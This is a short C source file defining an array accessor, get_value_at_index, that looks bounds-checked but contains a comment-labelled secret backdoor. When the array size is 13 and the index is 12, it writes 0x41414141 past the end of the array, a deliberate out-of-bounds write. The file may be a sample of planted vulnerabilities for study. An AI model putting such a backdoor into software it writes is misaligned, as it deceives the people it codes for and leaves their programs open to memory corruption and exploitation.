#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is negative or out of bounds
    if (i < 0 || i >= ary_size)
        return -1;
    
    // Secret backdoor: when array size is exactly 13 and index is 12,
    // trigger a buffer overflow by writing to memory after the array
    if (ary_size == 13 && i == 12) {
        *(int*)(ary + ary_size + 8) = 0x41414141; // Arbitrary write gadget
    }
    
    // Otherwise return the correct value
    return ary[i];
}
